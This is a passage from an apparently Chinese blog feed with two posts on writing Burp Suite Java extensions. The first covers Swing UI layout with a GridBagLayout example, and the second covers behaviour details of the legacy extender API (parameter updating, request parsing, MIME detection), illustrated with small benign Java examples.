class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.border.EmptyBorder;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GridBagLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;GridBagLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">wrapPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                wrapPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BoxLayout</span>(wrapPane, BoxLayout.Y_AXIS));<br>                wrapPane.setBorder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyBorder</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>                <span class="hljs-type">JScrollPane</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JScrollPane</span>(wrapPane);<br>                contentPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);<br>                contentPane.getVerticalScrollBar().setUnitIncrement(<span class="hljs-number">30</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">settingPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                settingPanel.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridBagLayout</span>());<br>                <span class="hljs-type">GridBagConstraints</span> <span class="hljs-variable">constraints</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GridBagConstraints</span>();<br>                constraints.anchor = GridBagConstraints.WEST;<br>                constraints.fill = GridBagConstraints.NONE;<br>                constraints.insets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Insets</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br><br>                <span class="hljs-type">JLabel</span> <span class="hljs-variable">urlLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;URL:&quot;</span>);<br>                constraints.gridx = <span class="hljs-number">0</span>;<br>                constraints.gridy = <span class="hljs-number">0</span>;<br>                settingPanel.add(urlLabel, constraints);<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">urlField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                constraints.gridx = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">1.0</span>;<br>                constraints.fill = GridBagConstraints.HORIZONTAL;<br>                settingPanel.add(urlField, constraints);<br><br>                <span class="hljs-type">JLabel</span> <span class="hljs-variable">apiKeyLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;API KEY:&quot;</span>);<br>                constraints.gridx = <span class="hljs-number">0</span>;<br>                constraints.gridy = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">0.0</span>;<br>                settingPanel.add(apiKeyLabel, constraints);<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">apiKeyField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                constraints.gridx = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">1.0</span>;<br>                constraints.fill = GridBagConstraints.HORIZONTAL;<br>                settingPanel.add(apiKeyField, constraints);<br><br>                settingPanel.setAlignmentX(Component.LEFT_ALIGNMENT);<br>                settingPanel.setMaximumSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">300</span>, settingPanel.getPreferredSize().height));<br>                wrapPane.add(settingPanel);<br><br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.setSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">600</span>, <span class="hljs-number">360</span>));<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-6.png" alt="burpsuite-java-extension-ui-6"></p><p>说明：</p><p>每次把组件添加到布局时，传递一个<code>GridBagConstraints</code>对象，在该对象里指定将组件放置在哪一行、哪一列，占几行，占几列，是否沿水平方向伸展等。一些<code>GridBagConstraints</code>对象属性 ：</p><ul><li><p><code>gridx</code>：组件的横坐标，即组件在第几列</p></li><li><p><code>gridy</code>：组件的纵坐标，即组件在第几行</p></li><li><p><code>gridwidth</code>：组件所占列数，即宽度，默认为1</p></li><li><p><code>gridheight</code>：组件所占行数，即高度，默认为1</p></li><li><p><code>fill</code>：当组件在其格内而不能占满其格时，通过<code>fill</code>的值来设定填充方式，有四个可选值：<code>GridBagConstraints.NONE</code>（默认），<code>GridBagConstraints.HORIZONTAL</code>，<code>GridBagConstraints.VERTICAL</code>，<code>GridBagConstraints.BOTH</code>。</p></li><li><p><code>weightx</code>：行的权重，通过这个属性来决定如何分配行的剩余空间，默认为0。</p></li><li><p><code>weighty</code>：列的权重，通过这个属性来决定如何分配列的剩余空间，默认为0。</p></li><li><p><code>anchor</code>：当组件比单元格小时，指定将组件放在单元格的哪个位置。有九个可选值：</p>  <figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">FIRST<span class="hljs-emphasis">_LINE_START  PAGE_START  FIRST_LINE_END</span><br><span class="hljs-emphasis">LINE_START        CENTER      LINE_END</span><br><span class="hljs-emphasis">LAST_LINE_START   PAGE_END    LAST_LINE_</span>END<br></code></pre></div></td></tr></table></figure></li><li><p><code>ipadx</code>：组件横向内填充，默认为0。（没用过）</p></li><li><p><code>ipady</code>：组件纵向内填充，默认为0。（没用过）</p></li><li><p><code>insets</code>：组件外填充（没用过）</p></li></ul><p>上面只提到我在开发BP插件时一些常用的布局和方法，灵活运用它们，布局里嵌布局，基本可以实现想要的UI布局。 </p><h2 id="Java-Swing组件"><a href="#Java-Swing组件" class="headerlink" title="Java Swing组件"></a>Java Swing组件</h2><p>Java Swing 组件一览 ： <a href="https://docs.oracle.com/javase/tutorial/uiswing/components/index.html">https://docs.oracle.com/javase/tutorial/uiswing/components/index.html</a> ， 过一遍有什么组件，用到的时候再去看。</p><p>写UI界面基本上就是给组件设置文本、大小，设置监听，但有时候需要丰富组件的功能，如实现一个可以搜索的下拉框，显示Placeholder的文本框，支持撤销重做的文本框等等，可以去问ChatGPT或网上搜搜。如果是再复杂一些的，可能就需要自己实现了。</p><p>附：Burp默认会给组件设置一些样式，如字体，表格颜色，<code>JProgressBar</code>进度条样式（圆角、橙色） 等等。</p><h2 id="灵活操作UI"><a href="#灵活操作UI" class="headerlink" title="灵活操作UI"></a>灵活操作UI</h2><p>Java Swing的UI操作比较灵活，可以有一些”骚操作“，像：</p><ol><li>前段时间我写的小插件 <a href="https://github.com/Ovi3/burp-menu-level">burp-menu-level</a> ，可以修改Burp右键插件菜单的层级。 （可以在BApp Store插件商店里搜 <code>Change Menu Level</code>，点<code>Install</code>安装）</li><li>支持请求编辑框里自动补全Payload的 <a href="https://github.com/synacktiv/HopLa">HopLa</a> 插件。原理：通过注册<code>AWTEventListener</code>监听器，在<code>eventDispatched(AWTEvent event)</code>回调方法里获取<code>JTextArea</code>组件，并给<code>JTextArea</code>组件添加监听。</li><li>支持自定义TAB标题图标的 <a href="https://github.com/irsdl/BurpSuiteSharpenerEx">BurpSuiteSharpenerEx</a> 插件。</li></ol><h2 id="UI参考"><a href="#UI参考" class="headerlink" title="UI参考"></a>UI参考</h2><p>Github上有很多BP插件项目的UI可以参考，这里列几个：</p><ul><li><a href="https://github.com/vaycore/OneScan">OneScan</a> 的请求响应列表页面（类似BurpSuite Proxy页面），配置页面，它用的是 <a href="https://github.com/vaycore/OneScan/tree/v1.5.2/src/main/java/burp/vaycore/common/layout">自定义布局</a></li><li><a href="https://github.com/pmiaowu/BurpShiroPassiveSca">BurpShiroPassiveScan</a> 的请求响应列表页面（类似BurpSuite Proxy页面）</li><li><a href="https://github.com/gh0stkey/HaE">HaE</a> 的可增删改的表格页面</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;对我来说，编写UI是件比较烦的事。要调布局、大小、边界、颜色之类的，调半天，界面看起来才好看点。有时还遇到组件缩成一团或字显示不全的bug，实在烦。&lt;/p&gt;
&lt;p&gt;编写BP插件的UI，除了BurpSuite提供的几个UI API，其余的就是Java Swing知识了。&lt;/p</summary>
      
    
    
    
    
    <category term="Burpsuite" scheme="https://ovi3.github.io/tags/Burpsuite/"/>
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="Java" scheme="https://ovi3.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite Java插件开发 - API篇</title>
    <link href="https://ovi3.github.io/2024/01/18/burpsuite-java-extension-api/"/>
    <id>https://ovi3.github.io/2024/01/18/burpsuite-java-extension-api/</id>
    <published>2024-01-17T16:06:01.000Z</published>
    <updated>2024-07-21T05:46:47.608Z</updated>
    
    <content type="html"><![CDATA[<p>网上也有一些BP插件API相关的文章，本文主要就写BP插件API的一些细节，但不会覆盖到所有的API。下方是官方的API文档和示例代码链接。入门BP插件编写，主要就是看官方的几个示例代码，去编译运行，去用用，去查API文档，就差不多了。</p><p>旧API：</p><ul><li>官方文档：<a href="https://portswigger.net/burp/extender">https://portswigger.net/burp/extender</a></li><li>API： <a href="https://portswigger.net/burp/extender/api/index.html">https://portswigger.net/burp/extender/api/index.html</a></li><li>代码示例：<a href="https://github.com/PortSwigger?q=example-&amp;type=all&amp;language=&amp;sort=">https://github.com/PortSwigger?q=example-&amp;type=all&amp;language=&amp;sort=</a></li></ul><p>新API：</p><ul><li>官方文档：<a href="https://portswigger.net/burp/documentation/desktop/extensions/creating">https://portswigger.net/burp/documentation/desktop/extensions/creating</a></li><li>API：<a href="https://portswigger.github.io/burp-extensions-montoya-api/javadoc/index.html（2022年10月，官方出的新API）">https://portswigger.github.io/burp-extensions-montoya-api/javadoc/index.html（2022年10月，官方出的新API）</a></li><li>代码示例：<a href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">https://github.com/PortSwigger/burp-extensions-montoya-api-examples</a></li></ul><p>BP插件API都出新的了，不过这里还是说旧API，目前网上使用旧API的插件还是比较多的。</p><p>文中的代码主要在 Burpsuite Pro v2023.4.5 版本下测试运行。</p><h3 id="void-IBurpExtenderCallbacks-setExtensionName-java-lang-String-name"><a href="#void-IBurpExtenderCallbacks-setExtensionName-java-lang-String-name" class="headerlink" title="void IBurpExtenderCallbacks.setExtensionName(java.lang.String name)"></a>void IBurpExtenderCallbacks.setExtensionName(java.lang.String name)</h3><p>设置插件名。最好在插件入口一开始就设置。 因为插件名跟插件配置绑定，所以最好不要随意更改插件名。 插件名也被用于插件自己添加的TAB页的标题和右键 - Extensions 菜单显示。</p><h3 id="void-IBurpExtenderCallbacks-customizeUiComponent-java-awt-Component-component"><a href="#void-IBurpExtenderCallbacks-customizeUiComponent-java-awt-Component-component" class="headerlink" title="void IBurpExtenderCallbacks.customizeUiComponent(java.awt.Component component)"></a>void IBurpExtenderCallbacks.customizeUiComponent(java.awt.Component component)</h3><p>将指定的UI组件调整为Burp的UI风格。 </p><p>某些组件调用了这个方法会导致问题 ：</p><ul><li>鼠标不能拖动JTable表格的列头以更换顺序，即使表格调用了<code>table.getTableHeader().setReorderingAllowed(true)</code> 也不行</li><li><code>JComboBox</code>下拉框不能编辑，即使设置了<code>Editable</code>为<code>true</code>。</li></ul><p>解决方式：</p><ul><li>先调用<code>customizeUiComponent</code>方法，再修改组件（比如将<code>JComboBox</code>组件的<code>Editable</code>为<code>true</code>）。</li><li>不要调用<code>customizeUiComponent</code>方法，实际测试调不调用这个方法对界面外观没有什么影响。（所以这个方法是做了什么操作？没去细究）</li></ul><h3 id="void-IBurpExtenderCallbacks-addScanIssue-IScanIssue-issue"><a href="#void-IBurpExtenderCallbacks-addScanIssue-IScanIssue-issue" class="headerlink" title="void IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)"></a>void IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)</h3><p>将<code>Issue</code>添加到<code>Burpsuite</code>的<code>Dashboard</code>。</p><p>需自己编写一个实现<code>IScanIssue</code>接口的类。无论该类的<code>getIssueType()</code>方法返回什么值，由<code>IScannerListener</code>监听拿到的<code>issue</code>对象的<code>issueType</code>固定是 <code>0x08000000</code>，表示是由插件添加的<code>issue</code>。<code>IssueType</code>列表见：<a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a> 或 打开 <code>bupsuite - Target - Issue definitions</code>查看。</p><h2 id="byte-IExtensionHelpers-updateParameter-byte-request-IParameter-parameter"><a href="#byte-IExtensionHelpers-updateParameter-byte-request-IParameter-parameter" class="headerlink" title="byte[] IExtensionHelpers.updateParameter(byte[] request, IParameter parameter)"></a>byte[] IExtensionHelpers.updateParameter(byte[] request, IParameter parameter)</h2><p>更新HTTP请求中参数的值。如果更新了请求body，还会添加或更新Content-Length请求头。</p><p>该方法不会自动对参数值编码。且仅支持<code>IParameter.PARAM_URL</code>, <code>IParameter.PARAM_BODY</code> 和 <code>IParameter.PARAM_COOKIE</code>类型的<code>IParameter</code>对象，传递其他类型的<code>IParameter</code>对象会抛异常。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">IParameter</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> helpers.buildParameter(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;1&amp;b=2&quot;</span>, IParameter.PARAM_BODY);<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST / HTTP/1.1\r\nHost: example.com\r\n\r\nc=3&quot;</span>.getBytes();<br>        <span class="hljs-type">byte</span>[] request2 = helpers.updateParameter(request, a);<br>        callbacks.printOutput(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request2));<br><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">POST / HTTP/1.1</span><br><span class="hljs-comment">Host: example.com</span><br><span class="hljs-comment">Content-Length: 11</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">c=3&amp;a=1&amp;b=2</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><h2 id="void-IExtensionStateListener-extensionUnloaded"><a href="#void-IExtensionStateListener-extensionUnloaded" class="headerlink" title="void IExtensionStateListener.extensionUnloaded()"></a>void IExtensionStateListener.extensionUnloaded()</h2><p>该回调方法在卸载（unload）插件时被调用，关闭Burp时不会被调用。</p><p>通常在这个回调方法里关闭插件里启动的后台线程和连接、文件资源等，不然线程还会继续运行，容易造成问题。</p><h2 id="IRequestInfo"><a href="#IRequestInfo" class="headerlink" title="IRequestInfo"></a>IRequestInfo</h2><p>调用<code>IExtensionHelpers</code>对象的<code>IRequestInfo analyzeRequest(byte[] request)</code>方法解析请求数据，返回<code>IRequestInfo</code>对象，该对象包含一些请求信息，如请求头，参数列表等。<code>IRequestInfo</code>对象的几个方法的细节：</p><ul><li><p><code>java.util.List&lt;IParameter&gt; IRequestInfo.getParameters()</code>：返回请求包里的参数列表。burp支持解析的参数类型有URL query参数、Cookie、body里的urlencoded格式、json格式、xml格式或multipart格式的参数。对于multipart格式请求包的解析结果需要说明下，以下示例代码：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = (<span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Host: example.org\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Length: 259\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Disposition: form-data; name=\&quot;note\&quot;;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;test\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.txt\&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;content\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5--\r\n&quot;</span>).getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        <span class="hljs-keyword">for</span>(IParameter parameter: requestInfo.getParameters()) &#123;<br>            callbacks.printOutput(String.valueOf(parameter.getType()));<br>            callbacks.printOutput(parameter.getName());<br>            callbacks.printOutput(parameter.getValue());<br>            callbacks.printOutput(<span class="hljs-string">&quot;---------------------&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>  输出：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1</span>  <span class="hljs-comment">// 即 IParameter.PARAM_BODY</span><br>note<br>test<br>---------------------<br><span class="hljs-number">5</span>  <span class="hljs-comment">// 即 IParameter.PARAM_MULTIPART_ATTR</span><br>filename<br>test.txt<br>---------------------<br><span class="hljs-number">1</span>  <span class="hljs-comment">// 即 IParameter.PARAM_BODY</span><br>file<br>content<br>---------------------<br></code></pre></div></td></tr></table></figure><p>  <code>IParameter.PARAM_MULTIPART_ATTR</code>类型的参数，指multipart属性，即这里的<code>filename=&quot;test.txt&quot;</code>部分，而body里的其他参数归于<code>IParameter.PARAM_BODY</code>这类。body里的urlencoded格式参数也是<code>IParameter.PARAM_BODY</code>。</p><p>  另外对于xml这种<code>&lt;empty/&gt;</code>空元素不解析，但解析<code>&lt;empty&gt;&lt;/empty&gt;</code>这种，类型为<code>IParameter.PARAM_XML</code>。</p></li><li><p><code>java.util.List&lt;java.lang.String&gt; IRequestInfo.getHeaders()</code>：获取请求头列表，包含请求体第一行（如：<code>GET / HTTP/1.1</code>）</p></li><li><p><code>byte IRequestInfo.getContentType()</code>： 返回body的Content Type。其不是根据<code>Content-Type</code>请求头判断，而是根据body内容来判断：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST / HTTP/1.1\r\nHost: test.com\r\nContent-Type: application/json\r\n\r\n&lt;user&gt;admin&lt;/user&gt;&quot;</span>.getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        callbacks.printOutput(<span class="hljs-string">&quot;ct: &quot;</span> + requestInfo.getContentType());<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">3          // 即 IRequestInfo.CONTENT_TYPE_XML</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="IResponseInfo"><a href="#IResponseInfo" class="headerlink" title="IResponseInfo"></a>IResponseInfo</h2><p>调用<code>IExtensionHelpers</code>对象的<code>IResponseInfo analyzeResponse(byte[] response)</code>方法解析请求数据，返回<code>IResponseInfo</code>对象，该对象包含一些响应信息，如状态码，响应头，MIME类型等。</p><p><code>IResponseInfo</code>对象获取MIME类型有两个方法：</p><ul><li><code>java.lang.String IResponseInfo.getStatedMimeType()</code>：根据<code>Content-Type</code>响应头返回MIME类型</li><li><code>java.lang.String IResponseInfo.getInferredMimeType()</code>：根据body内容判断MIME类型。 （在Burp的<code>Proxy</code>面板的MIME列就是根据body内容判断的）</li></ul><p>返回值可能是<code>HTML</code>、<code>GIF</code>、<code>SVG</code>、<code>image</code>、<code>PNG</code>、<code>JPEG</code>、<code>CSS</code>、<code>JSON</code>、<code>XML</code>、<code>script</code>、<code>video</code> 或空字符串等。</p><h2 id="IParameter"><a href="#IParameter" class="headerlink" title="IParameter"></a>IParameter</h2><p>上面提到通过解析请求数据，获取请求参数列表，即<code>IParameter</code>对象列表。通过<code>IParameter</code>对象的<code>getValue()</code>方法可以获取到参数值，需要注意的是，获取到的值为未解码过的。示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST /redirect?url=http:%2f%2f HTTP/1.1\r\nHost: test.com\r\nContent-Type: application/json\r\n\r\n&#123;\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;remember\&quot;:1&#125;&quot;</span>.getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        <span class="hljs-keyword">for</span>(IParameter parameter: requestInfo.getParameters()) &#123;<br>            callbacks.printOutput(String.valueOf(parameter.getType()));<br>            callbacks.printOutput(parameter.getName());<br>            callbacks.printOutput(parameter.getValue());<br>            callbacks.printOutput(<span class="hljs-string">&quot;---------------------&quot;</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 